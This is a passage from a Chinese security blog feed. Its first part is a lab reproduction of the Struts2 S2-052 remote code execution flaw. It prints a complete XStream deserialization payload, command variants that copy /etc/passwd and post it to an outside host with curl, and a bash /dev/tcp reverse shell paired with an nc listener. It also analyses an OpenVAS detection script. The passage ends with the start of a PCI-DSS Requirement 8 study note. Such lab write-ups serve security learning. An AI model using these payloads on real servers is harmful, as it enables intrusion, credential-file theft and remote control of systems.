&lt;flags&gt;0&lt;/flags&gt; &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt; &lt;dataHandler&gt; &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt; &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt; &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt; &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt; &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt; &lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/<span class="built_in">test</span>&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt; &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><p>Body内容中的意思是在在tmp文件夹下面生成一个test文件。编辑重发后到指定目录检查：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ca23173b3e0218df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>成功生成了test文件；说明远程代码执行成功。验证了可以远程执行代码（RCE）攻击。</p><h3 id="使用burpsuite进行截包重发，查看结果"><a href="#使用burpsuite进行截包重发，查看结果" class="headerlink" title="使用burpsuite进行截包重发，查看结果"></a>使用burpsuite进行截包重发，查看结果</h3><p>首先下载安装bp：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://labfile.oss.aliyuncs.com/courses/726/burpsuite_free.jar</span><br></pre></td></tr></table></figure></p><p>打开：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/java -Xmx2g  -jar  burpsuite_free.jar</span><br></pre></td></tr></table></figure></p><p>设置firefox代理127.0.0.1:8080<br>注意firefox设置代理时要把下面的localhost和127.0.01关掉。<br>bp监听127.0.0.0:8080，如果点不了就是端口冲突，被占用了，换端口就行<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a4e3b64771ce3fe5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>然后进行抓包重发：<br>更改headers中更改Content-Type: application/xml<br>并将body中的更改为payload：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c201fbf8a0d10070.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>我重新发送的远程执行代码是要在/tmp下新建一个vuln文件。<br>Payload：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt; &lt;dataHandler&gt; &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt; &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt; &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt; &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt; &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt; &lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt; &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span><br><span class="line">&lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><p>执行后去指定文件夹查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1e926d0b31efc0df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>可以看到payload执行成功。</p><h3 id="Payload的大概规则"><a href="#Payload的大概规则" class="headerlink" title="Payload的大概规则"></a>Payload的大概规则</h3><p>在网上寻找了如何写payload的大概规则：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;touch /tmp/test.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>比如上面这样的是不会执行的，如果远程执行的命令有空格则需要用string进行转换<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;<span class="built_in">echo</span>&lt;/string&gt;</span><br><span class="line">&lt;string&gt;abc&lt;/string&gt;</span><br><span class="line">&lt;string&gt;&gt;&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/abc&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>这样也是不行的，应该是不支持重定向符号&gt;，管道符 | 应该也不支持。<br>下面看看一些成功的例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;cp&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt;/tmp/passwd&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;curl&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-F&lt;/string&gt;</span><br><span class="line">&lt;string&gt;value=@/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt; http://x.x.x.x/ &lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>curl命令执行可以成功，注意第三行<sting>的值不能有双引号，否则失败。<br>读取文件：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;curl&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-F&lt;/string&gt;</span><br><span class="line">&lt;string&gt;value=@/etc/passwd&lt;/string&gt;</span><br><span class="line">&lt;string&gt; http://x.x.x.x/ &lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></sting></p><p>通过在服务端<a href="http://x.x.x.x/抓包，发现/etc/passwd被post了过来。" target="_blank" rel="noopener">http://x.x.x.x/抓包，发现/etc/passwd被post了过来。</a></p><h3 id="尝试反弹shell"><a href="#尝试反弹shell" class="headerlink" title="尝试反弹shell"></a>尝试反弹shell</h3><p>首先尝试bash –c这个命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;touch /tmp/abc.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>利用firefox抓包重发后，返回500：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6f100a041e96f4a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>我们进入指定文件夹看看有没有写入成功：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-429ab44fe9449fa3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>成功写入，说明了bush 命令可以执行。<br>使用重定向符号&gt;创建任意文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;<span class="built_in">echo</span> abcd &gt;/tmp/abcd.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>进入查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c07fecede473f26c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>成功！<br>可以把ip addr的命令执行结果输出到/tmp/ip.txt<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;ip addr &gt;/tmp/ip.txt&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-3b3f2cd46d45d60f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>成功，查看一下写入情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-cc259505a235e9ef.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12_LI.jpg"><br>全部导出了得到了！<br>下面开始尝试反弹shell，利用下面的命令：（&amp;要转换成&amp;amp）:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">command</span>&gt;</span><br><span class="line">&lt;string&gt;bash&lt;/string&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.72.141/22222 0&gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p><p>在firefox编辑重发之前先要监听一个端口：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc –lvvp 22222   //port</span><br></pre></td></tr></table></figure></p><p>Firefox编辑重发后，上面填的是攻击方的ip和端口号就可以连接啦！：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8059257cadd155cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>成功反弹shell！</p><h3 id="试分析如果公司服务器存在这种漏洞，会对公司有什么影响？"><a href="#试分析如果公司服务器存在这种漏洞，会对公司有什么影响？" class="headerlink" title="试分析如果公司服务器存在这种漏洞，会对公司有什么影响？"></a>试分析如果公司服务器存在这种漏洞，会对公司有什么影响？</h3><p>我们尝试了可以远程执行命令成功，结合我们上个实验，如果我们写入一个木马到目标用户的指定路径下，则可进行进一步的攻击操作。比如写入反弹shell等等。攻击者可以进行各种操作从而获取服务器的给权限，并生成后门。便可进行一些非法操作，给公司造成包括信息泄露在内的巨大损失。</p><h2 id="使用openvas对该存在的漏洞系统进行扫描"><a href="#使用openvas对该存在的漏洞系统进行扫描" class="headerlink" title="使用openvas对该存在的漏洞系统进行扫描"></a>使用openvas对该存在的漏洞系统进行扫描</h2><h3 id="查看扫描结果，是否能得到对该漏洞的报告？"><a href="#查看扫描结果，是否能得到对该漏洞的报告？" class="headerlink" title="查看扫描结果，是否能得到对该漏洞的报告？"></a>查看扫描结果，是否能得到对该漏洞的报告？</h3><p><img src="http://upload-images.jianshu.io/upload_images/6269327-f0c7d5bcbf55003a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-742ff3e4cbe88ec8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>我们分别点开进入扫到了两个tomcat分析看到应该是第二个是对应的struts2-052漏洞，会导致远程代码执行漏洞：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-11f3ba2bf0a63857.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>在博主之前的博客说过如何查找nvt对应的文件，所以这里就不说了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-21f819f69e771673.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>源码分析：<br>首先源码的前一段是输出了漏洞的信息，然后<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ab7823d2e9a7e277.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>这边是提供下面所要调用的函数。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-793372d08a25f6cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>这里是定义一些参数获取端口号已经利用函数get_kb_list对传参进行测试。然后根据然后判断存不存在漏洞。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b08bf352d0a0a300.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"><br>对端口进行尝试连接，连不上则退出。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c25fc6821079d5b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>接着进行系统测试。判断是什么系统。然后获取host的名字。<br>下面定义了一个参数data，就是我们使用的payload。就是需要改包在body里面的东西。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-93c61212bdfec821.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"><br>截止对调用url利用struts2的指定目录进行测试，发送请求，接受请求，然后对返回的请求进行检测。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-01f2217419844ed0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="25.png"><br>对返回进行检测。如果不存在漏洞则退出。If中一个条件是收到返回，另一个条件是windows或者linux主机判断成功。</p><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><p>这次遇到的最主要的问题就是在扫描是发现扫不出tomcat的远程执行漏洞。主要是两个问题。一个是我没有将struts2-showcase导入的tomcat的指定目录下，因为struts2-rest-showcase是用于我们测试，而nasl脚本测试的则是struts2-showcase。另一个则是没有下载官网提供的对应版本的webapps的文件。解决这两个问题之后就成功扫出来了。<br>在反射shell时要注意一点要在攻击机上先监听端口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;Struts2-052漏洞学习&quot;&gt;&lt;a href=&quot;#Struts2-052漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;Struts2-052漏洞学习&quot;&gt;&lt;/a&gt;Struts2-052漏洞学习&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;了解漏
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="struts2-052" scheme="http://rliyuqing.github.io/tags/struts2-052/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(八)</title>
    <link href="http://rliyuqing.github.io/2019/04/15/21.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AB)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/21. PCI-DSS(V3.2.1)学习笔记(八)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:31.791Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-八"><a href="#PCI-DSS-V3-2-学习笔记-八" class="headerlink" title="PCI-DSS(V3.2)学习笔记(八)"></a>PCI-DSS(V3.2)学习笔记(八)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><h2 id="要求8：识别并验证对系统组件的访问"><a href="#要求8：识别并验证对系统组件的访问" class="headerlink" title="要求8：识别并验证对系统组件的访问"></a>要求8：识别并验证对系统组件的访问</h2><p>实施强效的访问控制，我们在要求7中已经针对用户对持卡人的访问进行限制了，对于一个强效的访问控制，我们不但要有明确的访问权限控制，同时我们也要确保每一个访问时授权的，是通过我们的验证的，防止有绕过我们访问限制机制来进行访问，所以我们对用户的访问还是要经过识别和验证的。<br>只有通过对访问请求的识别的验证，我们才能通过这个对系统组件的访问或者操作请求。<br>为了达到上面的要求，我们通过为所有有访问权限的角色分配唯一的id标识符，这样能让每个人对自己的操作负责，同时也为后面的通过用户id来识别提供标志。</p><h3 id="8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"><a href="#8-1-规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理" class="headerlink" title="8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理"></a>8.1 规定并实施政策和程序，确保对所有系统组件中的非消费者用户和管理员执行以下适当的用户识别管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6921dfb030e7c6bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1"><br>对于非消费者用户，比如我们公司的员工，对于这些用户，在他们对系统组件进行访问或者操作请求是要有身份识别。对于消费者用户是完全没有权限访问的，所有不在我们前面说的白名单里面，是被默认拒绝所有给拒绝了的。<br>这里可能会有一点歧义，这里的意思是所有的非消费者用户和管理员用户都得必须经过这个用户识别的过程，就是管理员用户也得经过这个审核。</p><h4 id="8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"><a href="#8-1-1-允许用户访问系统组件或持卡人数据之前，为期分配唯一ID" class="headerlink" title="8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID"></a>8.1.1 允许用户访问系统组件或持卡人数据之前，为期分配唯一ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f6b199b708bec201.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.1"><br>首先就是确保我们的用户在访问系统组件的时候有已经分配好的唯一识别的ID，这样确保在后期审核检查的时候可以根据ID找到对应的员工用户，明确每一个操作的责任。</p><h5 id="8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象"><a href="#8-1-2-控制添加、删除和修改用户ID、凭证和其他标识符对象" class="headerlink" title="8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象"></a>8.1.2 控制添加、删除和修改用户ID、凭证和其他标识符对象</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-caa7a1d737fd02ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.2"><br>我们前面一个说了根据标识符来明确每一个操作的责任，所以对于这个标识符来说我们要确保他是正确的，没有被恶意删改过得。<br>对于这个标识符的删改我们应该有强有力的控制手段，确保每一个删改都是有效的。攻击者很可能更改标识符ID来隐藏自己的痕迹，使我们更难找到漏洞。</p><h4 id="8-1-3-立即撤销到期用户的访问权"><a href="#8-1-3-立即撤销到期用户的访问权" class="headerlink" title="8.1.3 立即撤销到期用户的访问权"></a>8.1.3 立即撤销到期用户的访问权</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bf5fa2dca2b5379d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.3"><br>对于有期限的用户，或者说离职员工的用户等，我们要在第一时间撤销他们的访问权限。有些时候就会出现，我删除了某个用户，但是他对某些系统组件的访问权限还在，所以我们不仅要确保用户被安全删除并且撤销了用户的所有访问权限。<br>同时残留的员工数据可能不会受到足够安全的保护，这些信息会很容易泄露，若果没有妥善的处理这些账号遗留的权限，会带来不必要的麻烦。</p><h4 id="8-1-4-在90天内删除-禁用非活动的用户账户"><a href="#8-1-4-在90天内删除-禁用非活动的用户账户" class="headerlink" title="8.1.4 在90天内删除/禁用非活动的用户账户"></a>8.1.4 在90天内删除/禁用非活动的用户账户</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c411d7ed57b3e667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.4"><br>对于非活动用户的清理这在各种论坛网站上是很常见的，比如自己学校的bt站，pt站。定期删除这些不活动的账户也是很有必要的，首先这些可能是被攻击者恶意注册的账号，同时也减轻了我们服务器的压力，为需要的用户更好的提供服务。其次，对于注册条件困难的系统，不活跃的用户，更容易被攻击者攻击，从而获取用户数据或者进行进一步的攻击。</p><h4 id="8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"><a href="#8-1-5-通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID" class="headerlink" title="8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID"></a>8.1.5 通过如下远程访问管理第三方用于访问、支持或维护系统组件的ID</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d5cd1b6459842f3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.5"><br> 1、仅在需要的时间段启用并在不用时禁用<br> 2、使用时进行监控<br>因为一些业务或者其他的需要，我们经常会让第三方来访问我们的系统组件，我们可能会为他们分配指定的远程账户，或者公开，这样就增加了攻击者进入我们网络进行攻击行为的可能性。<br>比如我们在使用某个组件，需要服务商定期进行检测，这个时候就会对他们开放某个链接进行访问，如果攻击者发现这个链接，很有可能就利用这个进行攻击。<br>所以我们对于对第三方的访问，我们需要定时开放，需要的时候允许访问，不需要的时候则要禁止其的访问，其次在第三方访问的时候我们也要进行监控，及时发现攻击者的恶意访问。</p><h4 id="8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"><a href="#8-1-6-在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试" class="headerlink" title="8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试"></a>8.1.6 在不超过6次尝试后锁定用户ID，从而限制反复的访问尝试</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cec85de3d91de47e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.6"><br>嗯，确实很需要，但是对于错误次数要有一定的控制，因为这里我们是需要牺牲一部分的用户体验来换取更安全的环境。<br>但是这部分牺牲我觉得是十分值得的，对于密码的爆破现在已经被无数黑产做成了易建华攻击工具，网络上数不胜数。所以对于密码错误而锁定ID的要求是很有必要的，但是也有很多厂商更改成其他的比如错误一定次数后限制时间尝试，并且限制的时间依次上升，就比如iphone，这也是一样的效果，抵御了密码的爆破。</p><h4 id="8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID"><a href="#8-1-7-将锁定时间设为最少30分钟或直到管理员启用用户ID" class="headerlink" title="8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID"></a>8.1.7 将锁定时间设为最少30分钟或直到管理员启用用户ID</h4><p>好吧，这里所说的锁定用户和我上面说的是一个意思。我们可以根据系统的重要程度来确定锁定时间，如果是及其重要的系统，可以直接锁定，知道管理员启用用户ID。<br>但是到这里大家就会发现，这里面其实也是有漏洞的，记得之前有一个网上竞拍的例子，用户B为了以最低价格购买商品，在竞拍快结束时，恶意登录用户A的账户，直至被锁定，然后以较低价格购买商品。<br>在这里我们会发现，我们使用的安全策略有可能影响用户体验，甚至出现BUG，被人恶意利用获利。<br>所以每一项安全策略都不是完美的，牺牲某些东西来换取系统的安全。</p><h4 id="8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"><a href="#8-1-8-如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话" class="headerlink" title="8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话"></a>8.1.8 如果某会话空闲超过15分钟，则需要重新验证用户来重新激活终端或会话</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a908378b58d41701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.1.8"><br>如果用户在离开设备后没有安全退出系统，攻击者很有可能窃用了用户的身份，导致信息的泄露。所以对于一定时间未进行任何操作的用户我们需要对其进行注销，比如设置无动作不能超过15分钟。</p><h3 id="8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"><a href="#8-2-处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理" class="headerlink" title="8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理"></a>8.2 处理分配唯一ID以外，至少采用以下一种方法来验证所有用户，确保对所有系统组件中的非消费者用户和管理员执行恰当的用户验证管理</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-11dc522932b1fe2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2"><br>1、所知，如密码或口令<br>2、所有，如令牌设备或智能卡等<br>3、个人特征，如生物特征<br>我们除了分配唯一的标识符之外还得用其他的方法来验证用户身份，这里提到三个方法，基本业内使用的也都是这三种方法。首先是，口令或密码，我觉得这是远远不够的，所以可能还需要其他的方法，物理设备，令牌或者智能卡。以及第三种，个人特征，比如指纹或者虹膜等。<br>唯一的ID识别很容易被窃取，所以我们还需要其他的方法来验证用户身份。</p><h4 id="8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读"><a href="#8-2-1-使用强效加密法使所有验证凭证（例如密码-口令）在所有系统组件中传输和存储时均不可读" class="headerlink" title="8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读"></a>8.2.1 使用强效加密法使所有验证凭证（例如密码/口令）在所有系统组件中传输和存储时均不可读</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c28e3530fdbcb51a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 